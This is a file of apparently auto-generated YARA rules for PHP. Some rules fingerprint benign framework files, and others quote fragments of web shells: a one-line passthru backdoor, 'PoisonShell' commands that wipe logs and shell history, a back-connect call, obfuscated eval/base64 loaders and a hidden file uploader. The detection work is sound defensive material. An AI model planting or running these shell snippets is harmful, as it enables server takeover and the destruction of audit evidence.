      $s1 = "$form->get('createUser')->willReturn($createUserCheckForm);" fullword ascii
      $s2 = "function it_throws_invalid_argument_exception_when_data_does_not_implement_user_aware_interface(" fullword ascii
      $s3 = "$createUserCheckForm->getViewData()->willReturn(null);" fullword ascii
      $s4 = "function it_does_not_replace_user_form_by_new_user_form_when_create_user_check_is_checked(" fullword ascii
      $s5 = "$createUserCheckForm->getViewData()->willReturn('1');" fullword ascii
      $s6 = "$customer->getUser()->willReturn($user);" fullword ascii
      $s7 = "function it_replaces_user_form_by_new_user_form_when_create_user_check_is_not_checked(" fullword ascii
      $s8 = "$user->getId()->willReturn(null);" fullword ascii
      $s9 = "$event->getData()->willReturn($user);" fullword ascii
      $s10 = "function it_does_not_replace_user_form_by_new_user_form_when_user_has_an_id(" fullword ascii
      $s11 = "use Sylius\\Component\\User\\Model\\UserAwareInterface;" fullword ascii
      $s12 = "use Sylius\\Component\\User\\Model\\UserInterface;" fullword ascii
      $s13 = "$user->getId()->willReturn(1);" fullword ascii
      $s14 = "use Symfony\\Component\\EventDispatcher\\EventSubscriberInterface;" fullword ascii
      $s15 = "$form->add('user', '\\Fully\\Qualified\\ClassName', Argument::type('array'))->shouldNotBeCalled();" fullword ascii
      $s16 = "$event->getData()->willReturn($customer);" fullword ascii
      $s17 = "$form->add('createUser', Argument::type('string'), Argument::type('array'))->shouldBeCalled();" fullword ascii
      $s18 = "$form->add('user', '\\Fully\\Qualified\\ClassName', Argument::type('array'))->shouldBeCalled();" fullword ascii
      $s19 = "$event->getForm()->willReturn($form);" fullword ascii
      $s20 = "function it_adds_user_form_type_and_create_user_check(" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule adad7765fd47b6496a6cfc519d2c01bd7bf5416d
{
   meta:
      description = "php17 - file adad7765fd47b6496a6cfc519d2c01bd7bf5416d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "de8cc5750445235e703ddb8d771afcb47e5fde6782d4e3668399d9baa559787d"
   strings:
      $s1 = "<?php passthru($_POST[1])?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_7c8ed048a0572dc770ec0ef715c5676d2fdfff96
{
   meta:
      description = "php17 - file 7c8ed048a0572dc770ec0ef715c5676d2fdfff96.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "50ab64a194a184a48c503eb3bc11b373051020db9e1cc4bf1f7b8136d0a3cc0e"
   strings:
      $x1 = "nd / -name log* -exec rm -rf {} \\;', 'find / -name  *.log -exec rm -rf {} \\;', 'unset HISTFILE', 'unset SAVEHIST');" fullword ascii
      $x2 = "<td>Target : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=idiot value=target@hotmail.com size=44><tr>" fullword ascii
      $x3 = "$comandos = array('find / -name *.bash_history -exec rm -rf {} \\;', 'find / -name *.bash_logout -exec rm -rf {} \\;', 'fi" fullword ascii
      $x4 = "$link = \"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=\" . $verdad . \"&filter_exploit_tex" fullword ascii
      $x5 = "$conexion = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']) or die(\"<h1>Error</h1>\");" fullword ascii
      $x6 = "$tod = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']) or die(\"<h1>Error</h1>\");" fullword ascii
      $x7 = "echo \"<title>\" . $_SERVER[\"SERVER_NAME\"] . \" - PoisonShell</title>\";" fullword ascii
      $x8 = "$comandos = array('find / -name *.bash_history -exec rm -rf {} \\;', 'find / -name *.bash_logout -exec rm -rf {} \\;', 'find / -" ascii
      $x9 = "echo '<meta http-equiv=\"refresh\" content=\"0;URL=?serverftp=' . $_GET['serverftp'] . \"&user=\" . $_GET['user'] . \"&pas" fullword ascii
      $x10 = "<td>FakeMail : &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</td><td><input type=text name=falso value=lagarto@juancho.com size=44><tr>" fullword ascii
      $x11 = "echo \"<b>Web : </b><input type=text size=40 name=proxy value=http://localhost/sql.php><input type=submit value=Get>\";" fullword ascii
      $s12 = "if (!system(\"cd /tmp;perl back.pl \" . $_GET['ipar'] . \" \" . $_GET['portar'])) {" fullword ascii
      $s13 = "if ($mysql = @mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password'])) {" fullword ascii
      $s14 = "$paths = array(\"/var/log/lastlog\", \"/var/log/telnetd\", \"/var/run/utmp\", \"/var/log/secure\", \"/root/.ksh_history\", \"/ro" ascii
      $s15 = "$tod = @mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']);" fullword ascii
      $s16 = "$mysql = mysql_connect($_GET['host'], $_GET['usuario'], $_GET['password']);" fullword ascii
      $s17 = "system(\"cmd.exe\");" fullword ascii
      $s18 = "echo \"<center><table><tr><td class=main><br><h2>&nbsp;&nbsp;&nbsp;PoisonShell&nbsp;&nbsp;&nbsp;</h2><br></td><td class=main>" fullword ascii
      $s19 = "$link = \"http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=\" . $verdad . \"&filter_exploit_text" ascii
      $s20 = "if ($dentro = @ftp_login($enter, $_GET['user'], $_GET['pass'])) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 100KB and
      1 of ($x*) and all of them
}

rule php17_ApcCest
{
   meta:
      description = "php17 - file ApcCest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fddb2eab71964a2d8f744c686cbbfb2462ee80c4e5688b70550f66158b7ff5ba"
   strings:
      $x1 = "* through the world-wide-web, please send an email to license@phalconphp.com" fullword ascii
      $s2 = "* @link      http://www.phalconphp.com" fullword ascii
      $s3 = "* @author    Andres Gutierrez <andres@phalconphp.com>" fullword ascii
      $s4 = "* @author    Serghei Iakovlev <serghei@phalconphp.com>" fullword ascii
      $s5 = "* bundled with this package in the file LICENSE.txt" fullword ascii
      $s6 = "* The contents of this file are subject to the New BSD License that is" fullword ascii
      $s7 = "* Tests the \\Phalcon\\Mvc\\Model\\Metadata\\Apc component" fullword ascii
      $s8 = "* If you did not receive a copy of the license and are unable to obtain it" fullword ascii
      $s9 = "* \\Phalcon\\Test\\Unit\\Mvc\\Model\\Metadata\\ApcCest" fullword ascii
      $s10 = "* @copyright (c) 2011-2017 Phalcon Team" fullword ascii
      $s11 = "/** @var \\Phalcon\\Mvc\\Model\\MetaDataInterface $md */" fullword ascii
      $s12 = "throw new \\PHPUnit_Framework_SkippedTestError(" fullword ascii
      $s13 = "$this->data = require PATH_FIXTURES . 'metadata/robots.php';" fullword ascii
      $s14 = "* @package   Phalcon\\Test\\Unit\\Mvc\\Model\\Metadata" fullword ascii
      $s15 = "$I->haveServiceInDi('modelsMetadata', function () {" fullword ascii
      $s16 = "* so that we can send you a copy immediately." fullword ascii
      $s17 = "$md = $I->grabServiceFromDi('modelsMetadata');" fullword ascii
      $s18 = "apc_fetch('$PMM$app\\meta-phalcon\\test\\models\\robots-robots')" fullword ascii
      $s19 = "apc_fetch('$PMM$app\\map-phalcon\\test\\models\\robots')" fullword ascii
      $s20 = "namespace Phalcon\\Test\\Unit\\Mvc\\Model\\MetaData;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 6KB and
      1 of ($x*) and 4 of them
}

rule a7a09b010b51a3634ccc13ef3fe38796dedab0e8
{
   meta:
      description = "php17 - file a7a09b010b51a3634ccc13ef3fe38796dedab0e8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "e9e0ba0a83946d862b7e96d9d160ba854c39149bf9242867d7f7ed0c5cbafa27"
   strings:
      $s1 = "$c='[W$i]=\"\";$p=$ssW($p,3);W}if(Warray_keyW_exWistsW($i,$Ws)){$s[$Wi].=$pW;$e=sWtrpos(W$s[$i]W,$f);if(';" fullword ascii
      $s2 = "$z='nW(W);$dW=base6W4_encode(xW(gzcompWress(W$o),$Wk)W);print(\"<$kW>W$d</$k>\");@sessWion_deWsWtroy();}}}}';" fullword ascii
      $s3 = "$q='r=@$r[\"HTTP_WREFERWER\"];$ra=WW@$r[\"HTTPW_ACWCEPT_LANGWUWWAGEW\"];if($rr&&$ra)W{$u=parse_urlW($rr)W';" fullword ascii
      $s4 = "$U='W$kWh=\"5d41\";$kf=\"40W2a\";functWioWn x($t,W$k){$c=strWlWen($k);$l=stWrlen(W$t);W$o=\"\"W;for($WiW=0;$i<$W';" fullword ascii
      $s5 = "$v='$WWe){$Wk=$kh.$kfW;ob_sWtart();@evWal(@gWzuncWompWrWess(@x(@base6W4_decoWdWe(preWg_replace(array(\"';" fullword ascii
      $s6 = "$X='\"strtolower\";$i=$mW[1][0].$m[1][1]W;W$h=$sl($ss(md5W($iW.$Wkh)W,0,3))W;$f=$sl($ssW(md5($iW.$kf),';" fullword ascii
      $s7 = "$A='0,W3))W;$p=\"\";fWorW($z=1;W$z<count($Wm[1]);W$zW++)$p.=$q[$m[W2]W[$z]];if(sWtWrpos($p,$hW)==WW=0){$s';" fullword ascii
      $s8 = "$o='l;){for($jW=0;($j<$cW&&$Wi<$l);$jW++,$i++)W{$o.W=$Wt{$i}^$Wk{W$j};}}reWWturn $o;}$rW=$W_SERVEWR;$r';" fullword ascii
      $s9 = "$S='0.([W\\\\d]))?,W?/\",$ra,$mW);if($qW&&$m){W@sessWion_WsWtart();$sW=&WW$_SESWSION;W$ss=\"sWubWstr\";$WslW=';" fullword ascii
      $s10 = "$a=';WparsWe_sWtr($u[\"querWy\"],$q);$q=WWarray_valuWeWs($q)W;preg_matcWh_alWl(\"/([\\\\Ww])[W\\\\w-]+(?:W;q=';" fullword ascii
      $s11 = "$K='/W_/\"W,\"/WW-/\"),aWrray(\"/\",\"+\"),W$ss(W$s[$i],0,$e)))W,$kW)));$o=oWb_geWt_coWntentWs();ob_endW_clea';" fullword ascii
      $s12 = "$C=str_replace('W','',$U.$o.$q.$a.$S.$X.$A.$c.$v.$K.$z);" fullword ascii
      $s13 = "$N=str_replace('gB','','cgBreagBte_gBfugBngBgBction');" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule sig_89035d926cc0dbe2b4be0e8d4da1451f6995a8b8
{
   meta:
      description = "php17 - file 89035d926cc0dbe2b4be0e8d4da1451f6995a8b8.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "1b22c08def8cd3be4b791dd0e5aa47bf2fd279a0612be9096e7af48a7269fe9a"
   strings:
      $s1 = "for ($b2617ce8e=0; $b2617ce8e<$GLOBALS[$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14].$GLOBALS['" fullword ascii
      $s2 = "for ($c3758cb0=0; $c3758cb0<$GLOBALS[$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14].$GLOBALS" fullword ascii
      $s3 = "$b2617ce8e<$GLOBALS[$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14].$GLOBALS['d88c71f1'][32].$GLOBAL" fullword ascii
      $s4 = "foreach ($GLOBALS[$GLOBALS['d88c71f1'][52].$GLOBALS['d88c71f1'][37].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][96].$GLOBA" fullword ascii
      $s5 = "echo @$GLOBALS[$GLOBALS['d88c71f1'][52].$GLOBALS['d88c71f1'][40].$GLOBALS['d88c71f1'][15].$GLOBALS['d88c71f1'][15].$GLOB" fullword ascii
      $s6 = "14].$GLOBALS['d88c71f1'][96].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][46].$GLOBALS['d88c71f1'][14]]($q174), $mb218));" fullword ascii
      $s7 = "d88c71f1'][32].$GLOBALS['d88c71f1'][37].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][42]]($q174);)" fullword ascii
      $s8 = "return $GLOBALS[$GLOBALS['d88c71f1'][84].$GLOBALS['d88c71f1'][96].$GLOBALS['d88c71f1'][30].$GLOBALS['d88c71f1'][42]]($GLOBAL" fullword ascii
      $s9 = "S[$GLOBALS['d88c71f1'][84].$GLOBALS['d88c71f1'][96].$GLOBALS['d88c71f1'][30].$GLOBALS['d88c71f1'][42]]($q174, $l7da), $a8295);" fullword ascii
      $s10 = "$GLOBALS['d88c71f1'][8].$GLOBALS['d88c71f1'][12] => @$GLOBALS[$GLOBALS['d88c71f1'][53].$GLOBALS['d88c71f1'][42].$GLO" fullword ascii
      $s11 = "$v3fc5 .= $GLOBALS[$GLOBALS['d88c71f1'][53].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][4" fullword ascii
      $s12 = "$GLOBALS['d88c71f1'][83].$GLOBALS['d88c71f1'][12] => $GLOBALS['d88c71f1'][40].$GLOBALS['d88c71f1'][31].$GLOBALS['d88" fullword ascii
      $s13 = "88c71f1'][37].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][46];" fullword ascii
      $s14 = "][76].$GLOBALS['d88c71f1'][32].$GLOBALS['d88c71f1'][53]] = $_POST;" fullword ascii
      $s15 = "][60]] = $GLOBALS['d88c71f1'][97].$GLOBALS['d88c71f1'][2].$GLOBALS['d88c71f1'][77].$GLOBALS['d88c71f1'][42];" fullword ascii
      $s16 = ".$GLOBALS['d88c71f1'][47].$GLOBALS['d88c71f1'][4].$GLOBALS['d88c71f1'][47].$GLOBALS['d88c71f1'][83], 0);" fullword ascii
      $s17 = "8c71f1'][42].$GLOBALS['d88c71f1'][32].$GLOBALS['d88c71f1'][42].$GLOBALS['d88c71f1'][37]]($a8295[$c3758cb0]));" fullword ascii
      $s18 = "'][17].$GLOBALS['d88c71f1'][14].$GLOBALS['d88c71f1'][77].$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][15]](0);" fullword ascii
      $s19 = "][49].$GLOBALS['d88c71f1'][47].$GLOBALS['d88c71f1'][66].$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][22];" fullword ascii
      $s20 = "BALS['d88c71f1'][60].$GLOBALS['d88c71f1'][76].$GLOBALS['d88c71f1'][17].$GLOBALS['d88c71f1'][60]]()," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_4649625cae63cb7797c287724d06655f065199ba
{
   meta:
      description = "php17 - file 4649625cae63cb7797c287724d06655f065199ba.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "4f6d6bda542b8a126abc773d7d6bc7f862edf9580d543fecfcccae9194c38b6f"
   strings:
      $s1 = "<?php @eval(gzinflate(base64_decode(\"7X39W1vHlfDP5HnyP4xvVEtKhJDwZwBhE8AxGwws4KQp8OgR0hVoLST1SjKQxH+Mm91tNsm+NQ7YjjF2bGixcWwTg+" ascii
      $s2 = "Tk0+ORdB/BUudvXvz8ygvNn8du/TStZX3Fz/Y/PzCxu1FjAa0sPLOxtpcZPX+pQtXVmkLEEP1XLoGNsIrt3669BrevN/B/VVCHMP5GxiTCMUCvxY/0MX+5dev/+H2Jm4" ascii
      $s3 = "D5kyp9kRj4ORkPNT0Anj/srOLbph7hY2q/++Qtb9ku2k6+RtsdzlXMSlihmMuFQv6OtPpN8UMVb+glelwE5ZpFtprEPbfxr6/sIbiT40xvoXwX6Kn9AlVGuZ/A3OM1zv" ascii
      $s4 = "do8cCCY6OgoHGrTSpYiUPA/R6Ji+TMdOT5kxIjHynYJMUOibYAMBmBCHB0ZkgiwpkI3vH7N/7xvQ5mP+JuuB3a/B7xhwM9wI3a8C7xmzrwQsZ0yDjYzrp+IBxKKg3wKB" ascii
      $s5 = "GDHM+TumOciPpYrUAvexIDDfGx6jYpJnKgEwHO3nnNFZmS8DxVKmUz6VTODSaZhqDUYk87FumK1cuFcs5hIailUoqPTkF6aCdRZUJgcGm1oPC5IwiFDB22dNmwbRSFTP" ascii
      $s6 = "BY3RcjYkjwWfM2aQdlleeI5IVj40cGOw50jH4vMFShQzjJfqKhSQY5kAWjxugLfk4YuNoX8/fH+1+iX+6eKlvd5ETyQgH0/vbke5aTkthc8BwbUzUdRbz1amC3qRaTCe" ascii
      $s7 = "eiLHnOGkVC5w0YSrjgetBvl1GddpsrDVesCTiKCek2pa4MCCiMls0Tic0TteUKsYECEoBC6lawr7DVHt1XLQoFtnLT3R599gVyX5zgqvjvxO1yEEyRAN8qNF2UVxFR8E" ascii
      $s8 = "lOq5ixV9kT3V0PvP0YP/Rvi7RDxNWapbxHnDwDsmmr0MdR3p6n28xhlOTYOEYEaPDyqXy8O9hE4io5NKYVgYaGkHz5bKGrC0TFz3ZONjz9OFhJW8xJW8ie7h/wEcYRWZ" ascii
      $s9 = "YC9cijHV1H+o42jvMgqKMKDIW1K/Mi218Agj2VfN5cRH9+e4hoybmvv5h1ne0t7cmou6ZipWSV9prohHQBDym46K/fAKSii5CSJKEY+asvxw80/18PSnAYzxfGUCEiqG" ascii
      $s10 = "dlQlGGdBOFPSuHULwfH9yuGVrQylylFaXE60fQxoFQ9raWPOeMHvJyTXeVMyLe/N4AyEzvhcyHTNayK+ZCOmDRjUS8r0U2K1rb2f2zHXCJV1KUeI4AC3JVXyghoiRDuZ" ascii
      $s11 = "oZy9532HCaJIIshPHF5bYKVMSVNT3qRkM4v0EwtGbTC/xOV+GRjnhdN/z/jnB6kCc8EsEpAxjArQd+L8=\")));?>" fullword ascii
      $s12 = "XVOgFBOFbkocpob5zyTsnz7wyf33+n9Gz//L6G59zpm2+hzXxwBdnfnbtx+vrkfM3MGlhZWUVkzfWeTK+9DR39cwmdzs597u1pZuvtoxwMpvoXOv99fWxt766+ouReHP" ascii
      $s13 = "mysICngBohTJZN5m6RA3AeJqwTObDz9KEu6AuY0N9RwZufHHlF6jk1//19q80hhamSvDbLqbLC97tx0GJRIa+k8+Nh+2CEy+46tOF5dtHepc+vPm5DT0zhYv2SrI4juc" ascii
      $s14 = "vR9/TRzueRlwc1V4PqqUPb9+//dXqz3UUggp5uK5K79NKP2eOI4Iz1y+951N0oH9wWBXbrxWD3kUvYjxuMiIUi7paKoEGBFFJllOlHL3kY3fhk86ip34+d5FLCFQyBKt" ascii
      $s15 = "K58sjI/iS9JAg0g4Al86wjg//aZRiKwZCQFQM2XjFvVwy07lUPj2Zsspqs5X3IABGmJT+sJANu7RBNjT8oKlcpEsbwQ7dS0syOdVYZgbvRqP1Jgq048PPLQF1JQMGNRR" ascii
      $s16 = "vmxPgs+LHjS+AjDZNzZIhH4UZM+hduGkFXacDKuSTA8he3HmdXTRRiGvbSrVEQTDm3vdufxjBPRTk0NuvzX+29BqGhUL0t668NX/mi9XbG6du/Qeuhq//+MzVqC+TH0y" ascii
      $s17 = "gtrB4c2mmlVFCNjWVy8+2sGdNK5MqpADDxRvXLl+9fvl69MDKR6cvDwxcvr68+PKltlJ7GxAERAAqvcKrXy3fP//Zvc0zP7hx/Y3PFz9d+KfF39/58K3f4tcbb69/uvS" ascii
      $s18 = "49OXGcmT1/ulfXZrfma+0gjJbPHvxjbmPL1/CPqOOEt10gqsrH/IKxelq2bQ4eQH8KbVf1bJAXJOYFBL6bgcBhJmEM+ZeOffzN/7xzR+//PqdD+/+fvGPb77/1iebc2u" ascii
      $s19 = "56spXH//grbfw3zu3zy+fXjy/fOW3UVTcKC04urmkLn5w5auTL2McLDmO7r3/5mk+3Ma+AeXNw6/XXNdR9sNobxnPnW/UzsxmLafDj+9RtlDnS5+vLdy6e+HThX9aWGF" ascii
      $s20 = "rcx+//frLr9/86dlXFn939eTC3OqppS/W1zeWF7+//OXLJ5EyZITBM954W2ScJ7yUq5MtpYqPbGBDGqZNlChi6PFUPmQcMKJGu4AQAGNtB7gO1XExF7KqlVeiGShZxZl" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule ActiveRecord
{
   meta:
      description = "php17 - file ActiveRecord.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "375469966805dfdf3d51606446db289734024e9c5bad98754758afa389f56308"
   strings:
      $s1 = "* @license https://www.humhub.com/licences" fullword ascii
      $s2 = "* @param string $attribute attribute name. Use null to retrieve errors for all attributes." fullword ascii
      $s3 = "* @link http://php.net/manual/en/function.unserialize.php" fullword ascii
      $s4 = "* @link http://php.net/manual/en/function.serialize.php" fullword ascii
      $s5 = "* Note: Subclasses have to include $this->getAttributes() and $this->getOldAttributes()" fullword ascii
      $s6 = "* Returns the errors as string for all attribute or a single attribute." fullword ascii
      $s7 = "* @link https://www.humhub.org/" fullword ascii
      $s8 = "* @var \\humhub\\modules\\file\\components\\FileManager" fullword ascii
      $s9 = "* Relation to User defined in updated_by attribute" fullword ascii
      $s10 = "* Relation to User defined in created_by attribute" fullword ascii
      $s11 = "foreach ($this->getErrors($attribute) as $attribute => $errors) {" fullword ascii
      $s12 = "* @copyright Copyright (c) 2017 HumHub GmbH & Co. KG" fullword ascii
      $s13 = "* Unserializes the given string, calls the init() function and sets the attributes and oldAttributes." fullword ascii
      $s14 = "* @return string the error message" fullword ascii
      $s15 = "* Serializes attributes and oldAttributes of this record." fullword ascii
      $s16 = "public function getErrorMessage($attribute = null)" fullword ascii
      $s17 = "if (isset(Yii::$app->user) && $this->hasAttribute('created_by') && $this->created_by == \"\") {" fullword ascii
      $s18 = "* Description of ActiveRecord" fullword ascii
      $s19 = "* @return FileManager the file manager instance" fullword ascii
      $s20 = "* Returns a unique id for this record/model" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule actionlist_inc
{
   meta:
      description = "php17 - file actionlist.inc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "20a66f75c0d5ae9f33142e1101b876bcc1f464281250a18a024e6381f5f6b758"
   strings:
      $s1 = "* @subpackage processors.system" fullword ascii
      $s2 = "case \"304\" : return \"Duplicate Template Variable $itemid\"; break;" fullword ascii
      $s3 = "case \"2\" : return \"Viewing home page/ online users\"; break;" fullword ascii
      $s4 = "function getAction($lastaction, $itemid='') {" fullword ascii
      $s5 = "case \"16\" : return \"Editing template $itemid\"; break;" fullword ascii
      $s6 = "case \"301\" : return \"Edit Template Variable\"; break;" fullword ascii
      $s7 = "case \"302\" : return \"Save Template Variable\"; break;" fullword ascii
      $s8 = "case \"303\" : return \"Delete Template Variable\"; break;" fullword ascii
      $s9 = "case \"28\" : return \"Changing password\"; break;" fullword ascii
      $s10 = "case \"300\" : return \"Create Template Variable\"; break;" fullword ascii
      $s11 = "case \"20\" : return \"Saving template $itemid\"; break;" fullword ascii
      $s12 = "case \"21\" : return \"Deleting template $itemid\"; break;" fullword ascii
      $s13 = "case \"96\" : return \"Duplicate Template $itemid\"; break;" fullword ascii
      $s14 = "case \"99\" : return \"Manage Web Users\"; break;" fullword ascii
      $s15 = "case \"34\" : return \"Saving new password\"; break;" fullword ascii
      $s16 = "case \"19\" : return \"Creating a new template\"; break;" fullword ascii
      $s17 = "if (!function_exists('getAction')) {" fullword ascii
      $s18 = "case \"115\" : return \"View event log details $itemid\"; break;" fullword ascii
      $s19 = "* @package modx" fullword ascii
      $s20 = "case \"64\" : return \"Removing deleted content\"; break;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule sig_120_add_page_parent
{
   meta:
      description = "php17 - file 120_add_page_parent.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "eff2d81b5175cf3fa6dc690fa067a001458a9f3bd4f8d49058399a2b5c0f6195"
   strings:
      $s1 = "$sql = 'ALTER TABLE `' . $table . '` ADD `parent` int(6) NOT NULL AFTER `id`';" fullword ascii
      $s2 = "if (! $this->has_table_column($table, 'parent')) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule AMQPQueueException
{
   meta:
      description = "php17 - file AMQPQueueException.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7b116ebce5b126352039ba812c8f1fba2d08397af79fb2979c7cd20a009e08c4"
   strings:
      $s1 = "* @author Aleksey I. Kuleshov YOU GLOBAL LIMITED" fullword ascii
      $s2 = "* @package PHPDaemon\\Clients\\AMQP\\Driver\\Exception" fullword ascii
      $s3 = "use PHPDaemon\\Clients\\AMQP\\Driver\\Protocol\\Exception\\AMQPQueueExceptionInterface;" fullword ascii
      $s4 = "use PHPDaemon\\Clients\\AMQP\\Driver\\Protocol\\Exception\\AMQPException;" fullword ascii
      $s5 = "namespace PHPDaemon\\Clients\\AMQP\\Driver\\Exception;" fullword ascii
      $s6 = "* Class AMQPQueueException" fullword ascii
      $s7 = "class AMQPQueueException extends AMQPException implements AMQPQueueExceptionInterface" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_8cb2d336606426c172298acd90e37e512d4eee5d
{
   meta:
      description = "php17 - file 8cb2d336606426c172298acd90e37e512d4eee5d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8e9e35ab31cf5d00b1dc35c41e092d798ad8ea8a0656acc99a5837c181059d80"
   strings:
      $s1 = "=\"multipart/form-data\"><input name=\"upfile\" type=\"file\"><input type=\"submit\" value=\"ok\"></form><?php }?>" fullword ascii
      $s2 = "<?php if($_GET[\"woaini\"]==\"91ri\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if" ascii
      $s3 = "<?php if($_GET[\"woaini\"]==\"91ri\"){if ($_SERVER['REQUEST_METHOD'] == 'POST') { echo \"url:\".$_FILES[\"upfile\"][\"name\"];if" ascii
      $s4 = "sts($_FILES[\"upfile\"][\"name\"])){ copy($_FILES[\"upfile\"][\"tmp_name\"], $_FILES[\"upfile\"][\"name\"]); }}?><form method=\"" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}


rule _ui_pagination
{
   meta:
      description = "php17 - file _ui_pagination.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "0cea5e7bd8e46c7028bc7536a9f13e391aa1ba88d85800ed6ad268b68cd7cf79"
   strings:
      $s1 = "<li class=\"next <?= ($paginator['total'] - $paginator['offset'] > $paginator['limit']) ? '' : 'disabled'?>\">" fullword ascii
      $s2 = "<?= sprintf(@text('LIB-AN-RECORDS-AVAILABLE'), number_format($total)) ?>" fullword ascii
      $s3 = "<? defined('KOOWA') or die('Restricted access') ?>" fullword ascii
      $s4 = "<? foreach ($pages as $page) : ?>" fullword ascii
      $s5 = "<li class=\"prev <?= $paginator['offset'] == 0 ? 'disabled' : ''?>\">" fullword ascii
      $s6 = "<?= @text('LIB-AN-ACTION-PREVIOUS') ?>" fullword ascii
      $s7 = "<?= @text('LIB-AN-ACTION-NEXT') ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_945240b09fa9296c75da23da418b2a619102fdb3
{
   meta:
      description = "php17 - file 945240b09fa9296c75da23da418b2a619102fdb3.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "25fd7888fe0a33cb1c7c00151de1ed045c096a06d0cb9d27f898d699abd767a8"
   strings:
      $s1 = "<?php $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode(\"aWYoIWZ1bmN0aW9uX2V4aXN0c" ascii
      $s2 = "<?php $XnNhAWEnhoiqwciqpoHH=file(__FILE__);eval(base64_decode(\"aWYoIWZ1bmN0aW9uX2V4aXN0c" ascii
      $s3 = "3f112c39fc9a88cccda9ea4c998267079eeS03OyFcoriwuSc3VUIl3dw2JVi9Qj9W0BgA=" fullword ascii
      $s4 = "7bac13f112c39fc9a88cccda9ea4c998267079ee" ascii
      $s5 = "giWWl1bklVWTc2YkJodWhOWUlPOCIpKXtmdW5jdGlvbiBZaXVuSVVZNzZiQmh1aE5ZSU84KCRnLCRiPTApeyRhPWltcGxvZGUoIlxuIiwkZyk7JGQ9YXJyYXkoNjU1LD" ascii
      $s6 = "IzNiw0MCk7aWYoJGI9PTApICRmPXN1YnN0cigkYSwkZFswXSwkZFsxXSk7ZWxzZWlmKCRiPT0xKSAkZj1zdWJzdHIoJGEsJGRbMF0rJGRbMV0sJGRbMl0pO2Vsc2UgJG" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 2KB and
      all of them
}

rule sig_1e8d5fc249c669861ebbbaa9f19d834aa6892e5d
{
   meta:
      description = "php17 - file 1e8d5fc249c669861ebbbaa9f19d834aa6892e5d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ce4bc782df62cdef6e94740b1299a23001f37fcf138bffc21b435ee3f10fc45b"
   strings:
      $s1 = "$S='56,\"56+\"),$s56s($s5656[$i],0,$e))),$k)56));$56o56=ob_get_content56s56()56;ob_end_cle56an56();$d=base56645';" fullword ascii
      $s2 = "$o='gzuncompre56s56s56(@x(@bas56e64_decode(pr5656eg_repl56ace(array(\"/_/56\",\"/-/56\"56),array(\"/\"';" fullword ascii
      $s3 = "$H='6]]56;if(strpo56s($p,56$56h)56===0){$s[$i]=\"56\";$p=$ss56($p5656,3);}i56f(array_key56_exists(56$i,';" fullword ascii
      $s4 = "$l='6_encod56e(x(gzcompres56s($o),$56k));pr56in56t(\"<$k>$d56</$k>\")56;@se56ssion56_de56stroy();}}}}';" fullword ascii
      $s5 = "$h='$s)){56$s[$i56].=56$p;$e=st56rpos(56$s[$i],56$f);i56f(56$e){$k5656=$kh.$kf;56ob_start();@eva56l(@56';" fullword ascii
      $s6 = "$L='=56\"strt5656olower\";56$i=$m[1][0]56.$m56[1][561];$h=$sl(56$ss(md556(56$i56.$kh),560,3));$f=$56sl(';" fullword ascii
